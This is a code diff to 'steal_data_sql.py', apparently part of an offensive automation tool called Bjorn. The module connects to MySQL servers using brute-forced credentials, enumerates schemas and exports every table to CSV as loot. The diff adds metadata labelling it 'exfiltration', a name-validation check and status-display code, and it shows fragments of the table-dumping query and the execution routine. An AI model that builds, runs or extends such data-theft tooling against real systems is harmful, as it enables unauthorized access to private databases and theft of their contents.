@@ -1,13 +1,4 @@
-"""
-steal_data_sql.py — SQL data looter (DB-backed)
-
-SQL mode:
-- Orchestrator provides (ip, port) after parent success (SQLBruteforce).
-- DB.creds (service='sql') provides (user,password, database?).
-- We connect first without DB to enumerate tables (excluding system schemas),
-  then connect per schema to export CSVs.
-- Output under: {data_stolen_dir}/sql/{mac}_{ip}/{schema}/{schema_table}.csv
-"""
+"""steal_data_sql.py - Exfiltrate MySQL databases as CSV after successful bruteforce."""
 
 import os
 import logging
@@ -41,6 +32,12 @@ b_risk_level    = "high"                # 'low' | 'medium' | 'high'
 b_enabled       = 1                     # set to 0 to disable from DB sync
 # Tags (free taxonomy, JSON-ified by sync_actions)
 b_tags         = ["exfil", "sql", "loot", "db", "mysql"]
+b_category = "exfiltration"
+b_name = "Steal Data SQL"
+b_description = "Exfiltrate MySQL databases as CSV after successful credential bruteforce."
+b_author = "Bjorn Team"
+b_version = "2.0.0"
+b_icon = "StealDataSQL.png"
 
 class StealDataSQL:
     def __init__(self, shared_data: SharedData):
@@ -169,6 +166,11 @@ class StealDataSQL:
                 logger.info("Data steal interrupted.")
                 return
 
+            # Validate identifiers to prevent SQL injection
+            import re as _re
+            if not _re.match(r'^[a-zA-Z0-9_]+$', schema) or not _re.match(r'^[a-zA-Z0-9_]+$', table):
+                logger.warning(f"Skipping unsafe schema/table name: {schema}.{table}")
+                return
             q = text(f"SELECT * FROM `{schema}`.`{table}`")
             with engine.connect() as conn:
                 result = conn.execute(q)
@@ -192,6 +194,8 @@ class StealDataSQL:
     def execute(self, ip: str, port: str, row: Dict, status_key: str) -> str:
         try:
             self.shared_data.bjorn_orch_status = b_class
+            # EPD live status
+            self.shared_data.comment_params = {"ip": ip, "port": str(port), "databases": "0", "tables": "0"}
             try:
                 port_i = int(port)
             except Exception:
@@ -250,3 +254,6 @@ class StealDataSQL:
         except Exception as e:
             logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
             return 'failed'
+        finally:
+            self.shared_data.bjorn_progress = ""
+            self.shared_data.comment_params = {}
